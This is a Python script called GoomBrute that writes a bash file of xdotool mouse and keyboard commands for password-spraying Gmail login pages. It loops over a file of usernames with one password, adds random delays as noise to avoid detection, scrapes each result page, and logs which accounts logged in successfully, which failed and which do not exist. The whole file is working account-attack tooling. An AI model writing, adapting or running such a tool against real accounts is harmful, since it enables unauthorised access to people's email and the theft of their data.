#!/usr/bin/env python
# coding: utf


# GoomBrute is for brute forcing Gmail login windows via xdotool. 
# This script will generate a bash script for running xdotool commands.
# Run the output sh file in the appropriate environment.

########################################################################


from random import randrange # to generate noise
from pathlib import Path # to handle files
import sys # to enable command line arguments

# Command line arguments
target_url = sys.argv[1] # expects the target login url as a string
password = sys.argv[2] # expects the password to spray as a string
user_list = sys.argv[3] # expects path to a file


target_filename = "xdobrute.sh"
delay = 3 # seconds
load_time = 3 # seconds to wait for the page to load

# Browser search bar "x y"coordinates
search = "1011 95"

# Sign in button "x y" coordinates
sign_in = "1082 143"

# Username login field "x y" coordinates
user_field = "818 427"

# Password field "x y" coordinates
password_field = "820 454"

# Blank area "x y" coordinates
blank = "713 182"

output_dir = "GoomBruteOutput"

all_data = "988 191"

# Generates a value for creating noise between request delays.
# This is a function instead of a variable so that a new random
# is generated upon each call.
def add_noise():
    return randrange(0, 15)/10


# Load the usernames from file into a list.
print(f"Loading username file '{user_list}'...")
usernames = []
with open(user_list, "r") as user_file:
    for line in user_file:
        usernames.append(line)
print("Here are the first few usernames: " + str(usernames[0:5]))


print("Creating xdotool sh command list...")

commands = []

for user in usernames:
    # Navigate to the desired login portal'
    user = "".join(user.split())
    commands.append(f"xdotool mousemove {search} click 1 key ctrl+a")
    commands.append("xdotool key 'Delete'")
    commands.append(f"xdotool mousemove {search} click 1 type '{target_url}'")
    commands.append(f"xdotool mousemove {search} key 'Return'")
    commands.append(f"sleep {load_time + add_noise()}")
    commands.append(f"xdotool mousemove {sign_in} click 1")
    commands.append(f"sleep {load_time + add_noise()}")
    
    
    # Navigate the username entry page
    commands.append(f"xdotool mousemove {user_field} click 1 key ctrl+a") # clears field
    commands.append("xdotool key 'Delete'")
    commands.append(f"xdotool mousemove {user_field} click 1 type '{user}'") # inputs username
    commands.append(f"xdotool mousemove {user_field} click 1 key 'Return'") # submits username

    commands.append(f"sleep {load_time + add_noise()}")

    # Navigate the password entry page
    commands.append(f"xdotool mousemove {password_field} click 1 key ctrl+a")
    commands.append("xdotool key 'Delete'")
    commands.append(f"xdotool mousemove {password_field} click 1 type '{password}'")
    commands.append(f"xdotool mousemove {password_field} click 1 key 'Return'")
    
    commands.append(f"sleep {load_time + add_noise()}")
    
    # Save page results
    commands.append(f"xdotool mousemove {blank} click 1 key ctrl+a")
    
    name = user.split("@")[0]
    commands.append(f"xclip -o > \"{output_dir}/{name}.txt\"")

    # Add a delay
    commands.append(f"sleep {delay}")
    
    commands.append(f"sleep {load_time}")
    commands.append(f"xdotool mousemove {all_data} click 1")
    
    # Process page result.
    # Check whether a wrong password was submitted.
    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'Wrong password. Try again' | wc -c`")
    commands.append("if [ $result -eq 0 ]")
    commands.append("then")
    commands.append("incorrect_pass=false")
    commands.append("else")
    commands.append("incorrect_pass=true")
    commands.append("fi")
    
    # Check whether a show password option exists.
    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'show password' | wc -c`")
    commands.append("if [ $result -eq 0 ]")
    commands.append("then")
    commands.append("show_pass=false")
    commands.append("else")
    commands.append("show_pass=true")
    commands.append("fi")
 
    # Check whether the user does not exist.
    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'signed in to Google products like YouTube, try again with that email' | wc -c`")
    commands.append("if [ $result -eq 0 ]")
    commands.append("then")
    commands.append("invalid_user=false")
    commands.append("else")
    commands.append("invalid_user=true")
    commands.append("fi")
    
    # Determine whether the login was successful.
    commands.append("if [ $show_pass = true ] || [ $incorrect_pass = true ]")
    commands.append("then")
    commands.append("success=false")
    commands.append("else")
    commands.append("success=true")
    commands.append("fi")
    
    commands.append("if [ $success = true ]")
    commands.append("then")
    commands.append("if [ $invalid_user = false]")
    commands.append("then")
    commands.append(f"echo \"{user} Success\" >> {output_dir}/results.txt")
    commands.append(f"cat {output_dir}/results.txt")
    commands.append("exit")
    commands.append("else")
    commands.append(f"echo \"{user} INVALID_USER\" >> {output_dir}/results.txt")
    commands.append("fi")    
    commands.append("else")
    commands.append(f"echo \"{user} Failure\" >> {output_dir}/results.txt")
    commands.append("fi")
        

# Write the executable bash script.
print(f"Writing to '{target_filename}'...\n")
with open(target_filename, 'w') as output_file:
    print('#!/bin/bash')
    output_file.write("#!/bin/bash\n")
    output_file.write(f"mkdir {output_dir}\n")
    for line in commands:
        print(line)
        output_file.write(line)
        output_file.write('\n')
    output_file.write(f"cat {output_dir}/results.txt")
